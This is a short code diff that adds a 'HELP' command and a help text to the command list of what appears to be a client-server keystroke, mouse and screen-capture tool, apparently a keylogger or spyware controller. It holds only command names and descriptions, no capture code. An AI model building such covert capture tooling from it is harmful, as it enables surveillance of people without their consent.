@@ -20,6 +20,7 @@ TASKS = [
         "MOVE",#
         "PING",
         "PICTURE_MODE",
+        "HELP"
     ]
 
 TASKS_DESCRIPTION = [
@@ -43,5 +44,28 @@ TASKS_DESCRIPTION = [
     "Delete log",
     "Move the client",
     "Ping the server",
-    "Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]"
+    "Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]",
+    """
+    PAUSE_SERVER :          Server will be paused
+    STOP_SERVER :           Server will be stopped
+    STOP_CAPTURE_KEYBOARD : Keyboard capture will be stopped
+    STOP_CAPTURE_MOUSE :    Mouse capture will be stopped
+    STOP_CAPTURE_PICTURE :  Picture capture will be stopped
+    RESTART_SERVER :        Server will be restarted
+    STOP_LOG_KEYBOARD :     Keyboard log will be stopped
+    STOP_LOG_MOUSE :        Mouse log will be stopped
+    STOP_LOG_PICTURE :      Picture log will be stopped
+    START_LOG_KEYBOARD :    Keyboard log will be started
+    START_LOG_MOUSE :       Mouse log will be started
+    START_LOG_PICTURE :     Picture log will be started
+    STATUS_SERVER :         Server status
+    STATUS_LOG :            Log status
+    RESET_CONFIG :          Reset configuration
+    KILL :                  Kill client
+    LOG_TIMER :             Add log timer
+    DELETE_LOG :            Delete log
+    MOVE :                  Move the client on random path (not implemented)
+    PING :                  Ping the server
+    PICTURE_MODE :          Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]
+    """
 ]
